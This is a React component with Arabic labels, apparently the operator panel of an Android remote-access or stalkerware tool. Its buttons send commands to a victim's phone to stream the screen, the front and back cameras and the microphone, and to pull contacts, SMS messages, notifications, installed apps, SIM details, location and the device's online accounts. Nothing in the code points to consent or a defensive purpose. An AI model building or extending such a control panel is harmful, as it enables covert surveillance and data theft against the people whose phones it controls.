import { useState } from 'react';
import { sendCommand } from '../../../services/api';
import { Card } from '../../ui/Card';
import { Button } from '../../ui/Button';
import { LayoutGrid, Radio, Monitor, MessageSquare, Shield, AppWindow, Users, Bell, Smartphone } from 'lucide-react';

interface Props { token: string }

export function ComprehensiveControlTab({ token }: Props) {
  const [loading, setLoading] = useState<string | null>(null);

  const doCmd = async (cmd: string, label: string) => {
    setLoading(label);
    try { await sendCommand(token, cmd); } catch { /* ignore */ }
    finally { setLoading(null); }
  };

  const sections = [
    {
      title: 'البث المباشر',
      items: [
        { cmd: 'stream_screen', label: 'بث الشاشة', icon: Monitor, color: 'from-violet-500 to-violet-600' },
        { cmd: 'stream_camera_front', label: 'بث الكاميرا الأمامية', icon: Monitor, color: 'from-sky-500 to-sky-600' },
        { cmd: 'stream_camera_back', label: 'بث الكاميرا الخلفية', icon: Monitor, color: 'from-indigo-500 to-indigo-600' },
        { cmd: 'micro_on', label: 'بث الميكروفون', icon: Radio, color: 'from-emerald-500 to-emerald-600' },
      ],
    },
    {
      title: 'جلب البيانات',
      items: [
        { cmd: 'get_contacts', label: 'جهات الاتصال', icon: Users, color: 'from-pink-500 to-pink-600' },
        { cmd: 'get_sms', label: 'رسائل SMS', icon: MessageSquare, color: 'from-sky-500 to-sky-600' },
        { cmd: 'get_notifications', label: 'الإشعارات', icon: Bell, color: 'from-amber-500 to-amber-600' },
        { cmd: 'list_apps', label: 'التطبيقات', icon: AppWindow, color: 'from-emerald-500 to-emerald-600' },
        { cmd: 'get_number', label: 'معلومات الشرائح', icon: Smartphone, color: 'from-cyan-500 to-cyan-600' },
      ],
    },
    {
      title: 'الأمان',
      items: [
        { cmd: 'get_location', label: 'جلب الموقع', icon: Shield, color: 'from-rose-500 to-rose-600' },
        { cmd: 'get_account', label: 'الحسابات الإلكترونية', icon: Shield, color: 'from-violet-500 to-violet-600' },
      ],
    },
  ];

  return (
    <div className="space-y-6">
      <div className="flex items-center gap-3">
        <LayoutGrid size={20} className="text-primary-500" />
        <h2 className="text-lg font-semibold text-surface-900 dark:text-white">التحكم الشامل</h2>
      </div>

      {sections.map((section) => (
        <div key={section.title}>
          <h3 className="text-sm font-semibold text-surface-600 dark:text-surface-400 mb-3">{section.title}</h3>
          <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
            {section.items.map((item) => (
              <Card key={item.cmd} padding="sm" hover onClick={() => doCmd(item.cmd, item.label)}>
                <div className="flex items-center gap-3">
                  <div className={`w-10 h-10 rounded-xl bg-gradient-to-br ${item.color} flex items-center justify-center text-white shrink-0`}>
                    {loading === item.label ? (
                      <svg className="animate-spin h-5 w-5" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" /><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" /></svg>
                    ) : (
                      <item.icon size={18} />
                    )}
                  </div>
                  <span className="text-sm font-medium text-surface-700 dark:text-surface-300">{item.label}</span>
                </div>
              </Card>
            ))}
          </div>
        </div>
      ))}
    </div>
  );
}
